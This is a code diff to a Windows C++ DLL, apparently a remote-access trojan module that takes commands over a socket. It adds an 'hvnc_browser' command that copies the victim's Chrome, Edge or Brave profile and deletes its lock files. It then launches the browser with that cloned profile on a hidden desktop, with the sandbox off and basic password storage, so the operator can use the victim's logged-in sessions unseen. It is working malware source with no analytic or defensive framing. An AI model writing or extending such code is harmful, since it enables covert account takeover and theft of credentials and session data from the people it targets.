@@ -5,6 +5,9 @@
 #include <uxtheme.h>
 #include <dwmapi.h>
 #include <propidl.h>
+#include <shlobj.h>
+#include <shlwapi.h>
+#include <shellapi.h>
 #include <gdiplus.h>
 #include <objidl.h>
 #include <algorithm>
@@ -30,6 +33,9 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
@@ -1124,6 +1130,137 @@ static void input_loop() {
     }
 }
 
+static void delete_lock_files(const wstring& directory) {
+    static const vector<wstring> lockFiles = { L"SingletonLock", L"SingletonCookie", L"Parent.lock" };
+    WIN32_FIND_DATAW findData;
+    wstring searchPath = directory + L"\\*";
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            wstring fileName = findData.cFileName;
+            if (fileName == L"." || fileName == L"..") continue;
+
+            wstring fullPath = directory + L"\\" + fileName;
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                delete_lock_files(fullPath);
+            } else {
+                for (const auto& lock : lockFiles) {
+                    if (fileName == lock) {
+                        DeleteFileW(fullPath.c_str());
+                        break;
+                    }
+                }
+            }
+        } while (FindNextFileW(hFind, &findData));
+        FindClose(hFind);
+    }
+}
+
+static bool copy_directory(const wstring& source, const wstring& destination) {
+    wstring from = source + L'\0';
+    wstring to = destination + L'\0';
+
+    SHFILEOPSTRUCTW fileOp = { 0 };
+    fileOp.wFunc = FO_COPY;
+    fileOp.pFrom = from.c_str();
+    fileOp.pTo = to.c_str();
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_SILENT;
+
+    return SHFileOperationW(&fileOp) == 0;
+}
+
+static wstring get_browser_path(const wstring& browser) {
+    wstring subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser;
+    WCHAR path[MAX_PATH];
+    DWORD size = sizeof(path);
+
+    if (RegGetValueW(HKEY_LOCAL_MACHINE, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+        wstring result = path;
+        if (!result.empty() && result[0] == L'\"') {
+            result.erase(0, 1);
+            if (!result.empty() && result.back() == L'\"') result.pop_back();
+        }
+        if (PathFileExistsW(result.c_str())) return result;
+    }
+
+    size = sizeof(path);
+    if (RegGetValueW(HKEY_CURRENT_USER, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+        wstring result = path;
+        if (!result.empty() && result[0] == L'\"') {
+            result.erase(0, 1);
+            if (!result.empty() && result.back() == L'\"') result.pop_back();
+        }
+        if (PathFileExistsW(result.c_str())) return result;
+    }
+
+    if (browser == L"chrome.exe") {
+        if (PathFileExistsW(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
+            return L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
+            return L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
+    }
+
+    return L"";
+}
+
+static void launch_browser_thread(wstring browserExe) {
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    wstring browserPath = get_browser_path(browserExe);
+    if (browserPath.empty()) {
+        send_error("Browser executable not found: " + string(browserExe.begin(), browserExe.end()));
+        CoUninitialize();
+        return;
+    }
+
+    WCHAR localAppData[MAX_PATH];
+    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) != S_OK) {
+        send_error("Failed to get LOCALAPPDATA");
+        CoUninitialize();
+        return;
+    }
+
+    wstring profilePath;
+    if (browserExe == L"chrome.exe") profilePath = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+    else if (browserExe == L"msedge.exe") profilePath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+    else if (browserExe == L"brave.exe") profilePath = wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
+
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    wstring clonePath = wstring(tempPath) + L"HVNC_Profile_" + browserExe;
+
+    if (PathFileExistsW(profilePath.c_str())) {
+        copy_directory(profilePath, clonePath);
+        delete_lock_files(clonePath);
+    }
+
+    wstring args = L" --user-data-dir=\"" + clonePath + L"\" --no-sandbox --disable-gpu --password-store=basic --disable-extensions --remote-debugging-port=0";
+    wstring cmdLine = L"\"" + browserPath + L"\"" + args;
+    vector<wchar_t> cmdLineVec(cmdLine.begin(), cmdLine.end());
+    cmdLineVec.push_back(L'\0');
+
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    PROCESS_INFORMATION pi = { 0 };
+    if (CreateProcessW(NULL, cmdLineVec.data(), NULL, NULL, FALSE,
+                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB,
+                       NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status("Browser started with cloned profile on hidden desktop");
+    } else {
+        send_error("Failed to launch browser. Error: " + to_string(GetLastError()));
+    }
+
+    CoUninitialize();
+}
+
 static wstring utf8_to_wstring(const string& str) {
     if (str.empty()) return wstring();
     int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
@@ -1194,6 +1331,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_scalePercent = cmd.value("quality", 50);
             g_staticFrameCount = 0;
             g_forceFullFrame = true;
+        } else if (action == "hvnc_browser") {
+            wstring browserExe = utf8_to_wstring(cmd.value("path", "chrome.exe"));
+            thread(launch_browser_thread, browserExe).detach();
         } else if (action == "hvnc_run") {
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
